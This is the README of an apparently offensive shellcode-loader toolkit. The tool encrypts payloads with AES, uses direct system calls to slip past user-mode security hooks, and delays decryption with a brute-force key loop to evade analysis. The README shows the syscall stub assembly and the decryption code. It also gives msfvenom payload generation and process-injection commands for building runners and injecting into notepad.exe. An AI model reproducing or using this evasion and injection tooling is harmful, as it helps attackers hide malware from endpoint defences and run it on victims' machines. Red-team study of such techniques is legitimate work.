# GENERIC SYSCALL
This code impliments the Sorting by System Call Address method described in a [blogpost.](https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/)<br>

quick disasm with https://defuse.ca/online-x86-assembler.htm#disassembly
```
ZwX:
   58                          pop     rax            ; return address
   41 5A                       pop     r10
   50                          push    rax            ; save in shadow space as _rcx
   51                          push    rcx            ; rax = ssn
   58                          pop     rax
   52                          push    rdx            ; rcx = arg1
   41 5A                       pop     r10
   41 50                       push    r8             ; rdx = arg2
   5A                          pop     rdx
   41 51                       push    r9             ; r8 = arg3
   41 58                       pop     r8             ; r9 = arg4
   4C 8B 4C 24 20              mov     r9, [rsp + 0x20]
   0F 05                       syscall
   FF 64 24 18                 jmp     qword[rsp]
```
This is an interesting technique because it removes the need to both define native function types in our header files and to define each native function in assembly.  
Some prerequisite knowledge:  
- When a function is called the return address is pushed to the stack and execution jumps to the address of the function. So `call` is really like a `push ret` then `jmp faddr` instruction.  
- In x64 the fastcall calling convention is used. With fastcall four registers are used to hold the first four parameters of a function (`rcx`, `rdx`, `r8`, `r9`).  

So `pop rax` moves the return address from the top of the stack to `rax` register. Now `first parameter` of the function is at the top.  
`pop r10` moves the next item from the top of the stack to `r10`.
The return address in `rax` is moved back to the top of the stack with the `push rax` operation.
The first parameter of our ZwX fucntion is then pushed onto the stack with `push rcx`.  
The stack then starts to look more like the stdcall the underlying native function is expecting.  


## Encoding  
The shellcode is encrypted with AES-CBC encryption via the kokke TinyAES library.  
The IV and key are generated with the get_random_bytes function in the pycryptodome library.  
The shellcode payload is decrypted with a crude brute-force loop of the last two bytes of the key instead of using the sleep function.  
```c 
for (int i = 0x00; i<=0xff;i++) {
    key[14] = i;
    for (int j = 0x00; j <= 0xff;j++) {
        key[15] = j;
        AES_init_ctx_iv(&ctx, key, iv);
        AES_CBC_decrypt_buffer(&ctx, encrypted_instructions, ENCRYPTED_BIN_LEN);
``` 
There is a loader, which just runs the shellcode in the same process via function pointer, a loader that does the same thing but via sections, and a process injector.  

requirments:
```
gcc
python3
nasm
```

use  
`python3 -m venv env`  
`source env/bin/activate`  
`pip install pycryptodome`  
`msfvenom -p windows/x64/exec CMD='C:\Windows\System32\notepad.exe' EXITFUNC=process -f raw -o test.bin`  
`python build.py -inbin test.bin -execmethod runner`  
`python builder.py -inbin test.bin -execmethod section_inject --process notepad.exe --cmdline 'c:\\\\windows\\system32\\firefox.exe'`


```
usage: builder.py [-h] [-inbin INBIN] [-execmethod {section_inject,section_runner,section_runner_dll,runner,runner_dll}] [--process PROCESS] [--cmdline CMDLINE] [--v V]

generate AES encrypted shellcode runners

optional arguments:
  -h, --help            show this help message and exit
  -inbin INBIN          .bin file
  -execmethod {section_inject,section_runner,section_runner_dll,runner,runner_dll}
  --process PROCESS     process to inject (only with 'section_inject')
  --cmdline CMDLINE     cmdline argument to show (only with 'section_inject')
  --verbose             
  ```  

### References & Reading
Generally:  
hasherezade -- rely heavilly on her PEB lookup heeader code
forrest-orr -- excellent code to read and learn from  
batsec -- lots of python building stuff from his shad0w project
https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams  
https://github.com/simon-whitehead/assembly-fun/blob/master/windows-x64/README.md  